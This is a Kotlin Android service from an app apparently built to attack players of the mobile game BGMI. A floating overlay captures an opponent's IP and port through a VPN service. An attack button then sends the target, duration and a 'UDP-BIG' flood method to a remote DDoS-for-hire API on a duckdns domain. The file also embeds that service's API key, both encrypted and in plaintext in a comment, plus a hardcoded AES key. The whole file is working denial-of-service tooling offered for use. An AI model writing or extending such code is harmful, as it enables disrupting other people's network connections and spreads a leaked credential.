package com.teamjadugar.apk

import android.app.Service
import android.content.Intent
import android.graphics.PixelFormat
import android.net.VpnService
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Base64
import android.view.Gravity
import android.view.LayoutInflater
import android.view.View
import android.view.WindowManager
import android.widget.*
import java.net.HttpURLConnection
import java.net.URL
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec

class FloatingService : Service() {
    private lateinit var windowManager: WindowManager
    private lateinit var floatingView: View
    private lateinit var etIp: EditText
    private lateinit var etPort: EditText
    private lateinit var tvTime: TextView
    private lateinit var btnAttack: Button
    private lateinit var btnGetIp: Button
    private var selectedTime = 120

    companion object {
        var instance: FloatingService? = null
        var etIpRef: EditText? = null
        var etPortRef: EditText? = null
        var btnGetIpRef: Button? = null

        fun onIpFound(ip: String, port: String) {
            Handler(Looper.getMainLooper()).post {
                etIpRef?.setText(ip)
                etPortRef?.setText(port)
                btnGetIpRef?.text = "IP CAUGHT ✅"
                btnGetIpRef?.setBackgroundColor(android.graphics.Color.parseColor("#00FFCC"))
                btnGetIpRef?.setTextColor(android.graphics.Color.BLACK)
                Toast.makeText(instance, "BGMI IP Found!", Toast.LENGTH_SHORT).show()
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        instance = this
        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
        
        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.WRAP_CONTENT,
            WindowManager.LayoutParams.WRAP_CONTENT,
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL, 
            PixelFormat.TRANSLUCENT
        )
        params.gravity = Gravity.TOP or Gravity.START
        params.x = 50
        params.y = 150

        floatingView = LayoutInflater.from(this).inflate(R.layout.floating_panel, null)
        windowManager.addView(floatingView, params)

        etIp = floatingView.findViewById(R.id.fEtIp)
        etPort = floatingView.findViewById(R.id.fEtPort)
        tvTime = floatingView.findViewById(R.id.fTvTime)
        btnAttack = floatingView.findViewById(R.id.fBtnAttack)
        btnGetIp = floatingView.findViewById(R.id.fBtnGetIp)
        val seekBar = floatingView.findViewById<SeekBar>(R.id.fSeekBar)
        val btnClose = floatingView.findViewById<TextView>(R.id.btnClose)

        etIpRef = etIp
        etPortRef = etPort
        btnGetIpRef = btnGetIp

        btnClose.setOnClickListener { stopSelf() }

        seekBar.setOnSeekBarChangeListener(object : SeekBar.OnSeekBarChangeListener {
            override fun onProgressChanged(seekBar: SeekBar?, progress: Int, fromUser: Boolean) {
                selectedTime = 60 + (progress * 10) 
                tvTime.text = "PULSE DURATION: ${selectedTime}s"
            }
            override fun onStartTrackingTouch(seekBar: SeekBar?) {}
            override fun onStopTrackingTouch(seekBar: SeekBar?) {}
        })

        btnGetIp.setOnClickListener {
            btnGetIp.text = "SNIFFING..."
            btnGetIp.isEnabled = false
            
            val intent = VpnService.prepare(this)
            if (intent != null) {
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivity(intent)
            } else {
                startService(Intent(this, VpnService::class.java))
            }
        }

        btnAttack.setOnClickListener {
            val ip = etIp.text.toString().trim()
            val port = etPort.text.toString().trim()
            if (ip.isEmpty() || port.isEmpty()) {
                Toast.makeText(this, "Enter IP and Port!", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }
            btnAttack.text = "LAUNCHING..."
            btnAttack.isEnabled = false
            executeAttack(ip, port, selectedTime)
        }
    }

    private fun executeAttack(ip: String, port: String, time: Int) {
        Thread {
            try {
                val apiUrl = "https://specterapi.duckdns.org/api/v1/execute"
                
                // TERA ENCRYPTED API KEY (Decrypts to sp_live_065a318078f3efc19e0be720102e9a7e)
                val encryptedKey = "dDNad1gyeHBkbVZmTURZMVlUTXhPREEzT0dZelpXWmpNVGxsTUdKbE56SXdNVEF5WlRsaE4yVT0="
                val apiKey = decryptData(encryptedKey)

                val url = URL(apiUrl)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("x-api-key", apiKey)
                conn.doOutput = true

                val jsonInput = """{"target":"$ip","port":$port,"duration":$time,"method":"UDP-BIG"}"""
                conn.outputStream.use { os -> os.write(jsonInput.toByteArray()) }

                Handler(Looper.getMainLooper()).post {
                    if (conn.responseCode in 200..201) {
                        btnAttack.text = "ATTACK FIRED ✅"
                        btnAttack.setBackgroundColor(android.graphics.Color.parseColor("#00FFCC"))
                        btnAttack.setTextColor(android.graphics.Color.BLACK)
                    } else {
                        btnAttack.text = "FAILED ❌"
                        btnAttack.isEnabled = true
                    }
                }
            } catch (e: Exception) {
                Handler(Looper.getMainLooper()).post {
                    btnAttack.text = "ERROR ❌"
                    btnAttack.isEnabled = true
                }
            }
        }.start()
    }

    private fun decryptData(encryptedData: String): String {
        return try {
            val secretKey = "JadugarSecretKey1234567890123456" 
            val cipher = Cipher.getInstance("AES/ECB/PKCS5Padding")
            val keySpec = SecretKeySpec(secretKey.toByteArray(), "AES")
            cipher.init(Cipher.DECRYPT_MODE, keySpec)
            String(cipher.doFinal(Base64.decode(encryptedData, Base64.DEFAULT)))
        } catch (e: Exception) {
            ""
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        if (::floatingView.isInitialized) {
            windowManager.removeView(floatingView)
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
